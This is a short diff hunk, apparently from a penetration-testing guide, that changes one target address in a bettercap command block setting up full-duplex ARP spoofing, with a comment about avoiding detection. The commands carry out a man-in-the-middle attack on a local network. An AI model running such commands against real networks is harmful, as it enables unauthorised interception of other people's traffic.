@@ -50,7 +50,7 @@ bettercap -iface eth0
 
 ```bash
 # bettercap — target specific hosts, avoid detection
-> set arp.spoof.targets 10.0.0.50,10.0.0.51
+> set arp.spoof.targets 192.168.1.50,10.0.0.51
 > set arp.spoof.fullduplex true
 > set arp.spoof.internal true
 > arp.spoof on
